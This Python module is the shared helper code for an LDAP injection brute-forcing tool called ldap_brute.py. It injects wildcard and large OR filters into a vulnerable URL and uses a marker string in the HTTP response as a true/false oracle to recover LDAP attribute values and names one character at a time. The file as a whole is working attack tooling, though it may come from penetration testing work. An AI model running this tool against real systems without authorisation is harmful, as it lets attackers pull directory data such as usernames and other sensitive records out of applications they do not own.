"""A set of common functionality for ldap_brute.py"""

import argparse, logging, string, requests, sys, itertools, timeit

class BruteforceOptions():
    charset = None
    wordlist_file = None

    def charset_get(self):
        return self.charset

    def charset_set(self, premade_charset_name, custom_charset, wordlist):
        if wordlist:
            self.wordlist_file = wordlist
        elif custom_charset != None:
            self.charset = custom_charset
        else:
            self.charset = charset_get_premade(premade_charset_name)

class LdapGlobals():
    BRUTE = "BRUTE"
    start_time = timeit.default_timer()
    total_progress_calls = 0
    total_requests = 0
    bruteforce_options = BruteforceOptions()

LDAP_GLOBALS = LdapGlobals()
CHARSET_DEFAULT = "lower_and_digit"

def charset_get():
    return LDAP_GLOBALS.bruteforce_options.charset_get()

def charset_set(*args):
    LDAP_GLOBALS.bruteforce_options.charset_set(*args)

def succ(result):
    total_time = (timeit.default_timer()) - LDAP_GLOBALS.start_time
    time_info = "%ss total time, %s total HTTP requests" % (round(total_time, 3), LDAP_GLOBALS.total_requests)
    if result:
        print("Valid values found (%s):\n" % time_info)
        for r in result:
            print(r)
    else:
        print("No results found (%s.)" % time_info)

def err(message):
    logging.warn(message)
    sys.exit(1)

def request_true(url, true_string):
    progress_indicate()
    LDAP_GLOBALS.total_requests += 1
    logging.debug(url)
    response = requests.get(url)
    return true_string in response.text

def brute_char(base_url, charset, true_string, prefix):
    valid = []
    for c in charset:
        inj = "%s%s*" % (prefix, c)
        url = base_url % inj
        if request_true(url, true_string):
            valid.append(c)

    return valid

def progress_indicate():
    LDAP_GLOBALS.total_progress_calls += 1
    if LDAP_GLOBALS.total_progress_calls % 50 == 0:
        logging.info(str(LDAP_GLOBALS.total_progress_calls) + "...")

def or_generate(space_per_request, attribute_name, word_size, size_is_exact):
    charset = charset_get()
    or_base = "(|%s)"
    or_base_len = len(or_base) - 2
    real_free = space_per_request - or_base_len
    bruting_attr = attribute_name == LDAP_GLOBALS.BRUTE

    if bruting_attr:
        attr_base = "(%s=*)"
    else:
        attr_base = "(%s=%s)"

    if not size_is_exact:
        i = 0
    else:
        i = word_size - 1

    tmp = ""
    while i < word_size:
        i += 1
        possibilities = itertools.product(charset, repeat=i)
        for poss in possibilities:

            if bruting_attr:
                val = attr_base % "".join(poss)
            else:
                val = attr_base % (attribute_name, "".join(poss))

            # too large! flush
            if len(tmp) + len(val) > real_free :
                or_clause = or_base % tmp
                tmp = ""
                yield or_clause

            tmp += val

    # flush the rest.
    if tmp != "":
        or_clause = or_base % tmp
        yield or_clause

# Goes through each of the or filters, a string sort of like this:
# (|(gidNumber=18880)(gidNumber=18881)(gidNumber=18882)(gidNumber=18883)...)
def or_loop(or_subfilter):
    # substr the (|...)
    final = or_subfilter[2:-1]
    for spl in final.split(")"):
        if spl != "":
            yield spl + ")"

def logging_set(verbosity):
    fmt = "%(levelname)s - %(message)s"
    if verbosity == 0:
        logging.basicConfig(level=logging.WARNING, format=fmt)
    elif verbosity == 1:
        logging.basicConfig(level=logging.INFO, format=fmt)
    else :
        logging.basicConfig(level=logging.DEBUG, format=fmt)

    requests_log = logging.getLogger("requests")
    requests_log.setLevel(logging.WARNING)

def parser_get():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description="Bruteforces LDAP!", epilog=__doc__)
    parser.add_argument('URL', help="""The URL that is vulnerable to LDAP
        injection, with a %%s where the injection is.""")
    parser.add_argument('TRUE_STRING', help="""A string that appears in the
        response if LDAP says True. If string doesnt appear, false is assumed.""")
    parser.add_argument("--verbosity", "-v", type=int, help="0 warn, 1 info, 2 debug", default=1)

    bruteforce_options = parser.add_mutually_exclusive_group()
    bruteforce_options.add_argument("--charset", "-c", help="""The set of
    characters the script will attempt to use while bruteforcing.""",
    choices=['lower_and_digit', 'upperlower_and_digits', 'upperlower_hex',
        'digits', 'lower'], default=CHARSET_DEFAULT)
    bruteforce_options.add_argument("--charset-custom", "-C", help="""A custom string that
        contains all the charcters to use. E.g. '-C ABC389'""", default=None)
    bruteforce_options.add_argument("--wordlist", "-w", help="""For non-wildcard
        only: The path to a file we will use to bruteforce either attribute
        names or values.""", default=None)

    parser.add_argument('--no-wildcard', '-N', help="""Some LDAP values do not
        honor the wildcard. These need to be bruteforced without a wildcard, which
        is much slower.""", action="store_true")
    parser.add_argument("--brute-attr", '-A', help="""Bruteforce attribute
        names instead of values. Similar to -N, but it bruteforces attributes
        instead. All options that only work with non-wildcard also work with
        this""", action="store_true")

    parser.add_argument('--max-path-size', help="""For non-wildcard only: for
        bruteforcing DN names, which don't support wildcards, we create massive
        filters like (!(val=value1)(val=value2))[...] to be more efficient. This
        defines how long requests will be.""", default=8100)
    parser.add_argument("--attribute-name", "-a", help="""Required for
        non-wildcard bruteforcing.""")

    length_group = parser.add_mutually_exclusive_group()
    length_group.add_argument("--max-word-size", help="""For wildcard only: the max
        max length we are going to attempt to bruteforce.""", type=int, default=6)
    length_group.add_argument("--exact-word-size", help="""For wildcard only: The
        exact length of the string we are going to bruteforce.""", default=None, type=int)

    return parser


def charset_get_premade(charset_name):
    if charset_name == "lower_and_digit":
        charset = string.ascii_lowercase + string.digits
    elif charset_name == "upperlower_and_digits":
        charset = string.ascii_letters + string.digits
    elif charset_name == "upperlower_hex":
        charset = string.hexdigits
    elif charset_name == "digits":
        charset = string.digits
    elif charset_name == "lower":
        charset = string.ascii_lowercase

    return charset

